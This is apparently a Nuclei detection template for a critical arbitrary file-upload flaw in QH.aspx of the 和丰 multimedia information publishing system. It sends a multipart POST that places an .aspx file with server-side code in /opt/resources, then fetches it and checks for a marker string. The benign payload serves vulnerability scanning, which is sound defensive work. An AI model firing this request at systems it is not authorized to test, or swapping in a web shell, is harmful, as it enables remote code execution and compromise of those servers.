id: hefen-QH-upload
info:
  name: 和丰多媒体信息发布系统QH.aspx存在文件上传漏洞
  author: apple
  severity: critical
  description: 和丰多媒体信息发布系统QH.aspx存在文件上传漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%92%8C%E4%B8%B0%E5%A4%9A%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E5%8F%91%E5%B8%83%E7%B3%BB%E7%BB%9FQH.aspx%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |-
        POST /QH.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr

        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
        Content-Disposition: form-data; name="fileToUpload"; filename="{{filename}}.aspx"
        Content-Type: application/octet-stream

        <% response.write("whoisceshi") %>
        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
        Content-Disposition: form-data; name="action"

        upload
        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
        Content-Disposition: form-data; name="responderId"

        ResourceNewResponder
        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
        Content-Disposition: form-data; name="remotePath"

        /opt/resources
        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
      - |+
        GET /opt/resources/{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: application/json, text/plain, */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Referer: https://15.156.235.71/signin
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Te: trailers

    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
